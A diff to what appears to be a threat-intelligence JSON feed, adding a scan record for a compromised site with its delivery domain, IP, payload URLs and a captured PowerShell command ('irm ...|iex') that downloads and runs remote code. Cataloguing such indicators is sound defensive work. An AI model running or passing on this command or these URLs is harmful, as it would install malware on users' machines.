@@ -1230,5 +1230,31 @@
     ],
     "ReportId": "cmwitstsl15m00omlpia4l632",
     "ScannedAt": "2026-11-16T05:31:29.471000+00:00"
+  },
+  {
+    "UrlDomain": "www.almasfoundation.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "65.1.62.49"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/4c1b1a1b8058ca47",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/4c1b1a1b8058ca47'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/4c1b1a1b8058ca47"
+    ],
+    "ReportId": "cmwj0v9pp16ce0oml2knj3vss",
+    "ScannedAt": "2026-11-16T08:49:20.942000+00:00"
   }
 ]
